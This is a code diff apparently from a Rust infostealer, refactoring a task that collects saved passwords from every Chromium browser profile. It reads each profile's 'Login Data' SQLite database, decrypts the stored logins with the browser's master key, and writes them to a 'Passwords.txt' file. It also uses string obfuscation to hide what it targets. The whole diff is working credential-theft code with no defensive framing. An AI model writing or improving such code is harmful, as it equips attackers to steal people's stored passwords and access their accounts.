@@ -8,7 +8,7 @@ use sqlite::{read_sqlite3_database_by_bytes, TableRecord, TableRecordExtension};
 use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
 use crate::chromium::Browser;
-use crate::Password;
+use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Password};
 use obfstr::obfstr as s;
 use utils::browsers::chromium::decrypt_data;
 
@@ -30,41 +30,25 @@ impl Task for PasswordsTask {
     parent_name!("Passwords.txt");
 
     unsafe fn run(&self, parent: &Path) {
-        let mut passwords: Vec<Password> = self.browser
-            .profiles
-            .iter()
-            .filter_map(|profile| get_passwords(profile, &self.browser.master_key))
-            .flat_map(|v| v.into_iter())
-            .collect();
+        let Some(passwords) = collect_from_all_profiles(
+            &self.browser.profiles,
+            |profile| get_passwords(profile, &self.browser.master_key)
+        ) else {
+            return
+        };
 
-        if passwords.is_empty() {
-            return;
-        }
-
-        passwords.sort();
-        passwords.dedup();
-
-        let _ = passwords
-            .iter()
-            .map(|password| password.to_string())
-            .collect::<Vec<String>>()
-            .join("\n\n")
-            .write_to(parent);
+        let _ = to_string_and_write_all(&passwords, "\n\n", parent);
     }
 }
 
 fn get_passwords(profile: &Path, master_key: &[u8]) -> Option<Vec<Password>> {
-    let passwords_path = profile / s!("Login Data");
-    let bytes = passwords_path.read_file().ok()?;
-
-    let db = read_sqlite3_database_by_bytes(&bytes)?;
-    let table = db.read_table(s!("Logins"))?;
-
-    let cookies = table
-        .filter_map(|record| extract_password_from_record(&record, master_key))
-        .collect();
-
-    Some(cookies)
+    let login_data = profile / s!("Login Data");
+    
+    read_sqlite3_and_map_records(
+        &login_data,
+        s!("Logins"),
+        |record| extract_password_from_record(record, master_key)
+    )
 }
 
 fn extract_password_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<Password> {
